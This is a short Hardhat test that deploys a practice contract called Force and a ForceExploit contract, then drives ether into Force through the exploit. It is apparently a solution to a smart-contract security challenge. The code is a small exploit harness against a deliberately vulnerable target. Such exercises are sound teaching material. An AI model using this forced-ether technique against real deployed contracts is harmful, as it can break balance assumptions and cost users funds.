/* eslint-disable */
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract, ContractFactory } from "ethers";
import hre from "hardhat";

let ethers = hre.ethers;

describe("Exploit", function () {
  let owner: SignerWithAddress,
    addr1: SignerWithAddress,
    addr2: SignerWithAddress,
    addr3: SignerWithAddress,
    other: SignerWithAddress[];

  let Force: ContractFactory;
  let forceContract: Contract;

  let ForceExploit: ContractFactory;
  let forceExploitContract: Contract;

  before(async function () {
    [owner, addr1, addr2, addr3, ...other] = await ethers.getSigners();

    Force = await ethers.getContractFactory("Force");
    forceContract = await Force.deploy();
    await forceContract.deployed();

    ForceExploit = await ethers.getContractFactory("ForceExploit");
    forceExploitContract = await ForceExploit.deploy(forceContract.address);
    await forceExploitContract.deployed();
  });

  it("Exploit", async function () {
    let FUNC = "sendEther";
    let VALUES: any[] = [];

    const encodedFunctionCall =
      forceExploitContract.interface.encodeFunctionData(FUNC, VALUES);

    let tx = {
      to: forceExploitContract.address,
      value: ethers.utils.parseEther("10"),
      data: encodedFunctionCall,
    };
    await owner.sendTransaction(tx);

    console.log(await ethers.provider.getBalance(forceContract.address));
  });
});
